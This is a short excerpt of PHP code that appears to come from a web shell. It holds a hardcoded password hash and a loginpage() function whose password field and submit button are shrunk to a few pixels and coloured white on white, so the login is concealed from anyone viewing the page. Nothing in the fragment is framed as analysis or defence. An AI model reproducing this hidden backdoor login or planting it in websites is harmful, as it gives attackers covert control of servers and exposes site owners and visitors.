...
$pass  = '5320eb22e7de6e52424a2026faec4146'; 
...
function loginpage() {
	...
	<input class="input" name="password" id="password" value="" type="password" size="20" style="border:#fff 1px solid;background-color:#fff;width:6px;height:3px;" />
	<input class="input" name="" id="" value=" " type="submit" style="border:#fff 0px solid;background-color:#fff;width:3px;height:3px;" />
